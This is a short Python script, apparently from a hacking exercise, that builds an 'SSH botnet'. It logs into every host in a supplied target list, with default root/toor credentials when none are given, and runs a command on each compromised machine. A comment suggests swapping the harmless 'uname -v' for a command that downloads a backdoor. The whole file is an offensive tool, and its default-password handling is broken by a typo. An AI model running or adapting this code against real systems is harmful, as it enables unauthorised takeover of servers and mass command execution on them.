#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Tue May  8 22:43:38 2018

@author: starboy
"""
# Creating a botnet of ssh servers

import optparse
from pexpect import pxssh

class Client:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()
        
    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception as e:
            print(e)
            print('[-] Error Connecting')
            
    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before
    
def botnet_command(command):
    for client in botnet:
        output = client.send_command(command)
        print('[+] Output from '+client.host)
        print('[+] Output: '+ output)
        
def addClient(host,user,password):
    client = Client(host,user,password)
    botnet.append(client)
  
botnet = []

# Option parsing
parser = optparse.OptionParser('Usage:: -H <list of target host> -u <username> -p <password>')
parser.add_option('-H', dest='t_hosts', type='string', help='enter file name containing target hosts')
parser.add_option('-u', dest='username', type='string', help='enter the username')
parser.add_option('-p', dest='password', type='string', help='enter the password')

(options, args) = parser.parse_args()
hosts = options.t_hosts
password = options.password
user = options.username


# Check if parameters entered are empty
if hosts == None:
    print(parser.usage)
    print('Enter the hosts list file')
    exit(0)

# Using default root credentials if any particular set is not entered    
if password == None:
    passwoed = 'toor'    

if user == None:
    user = 'root'
    
# Iterating over all hosts present in the file
f = open(hosts, 'r')

for host in f.readlines():
    addClient(host,user,password)
    # Will print the version, we can use command to download backdoor instead
    botnet_command('uname -v') 

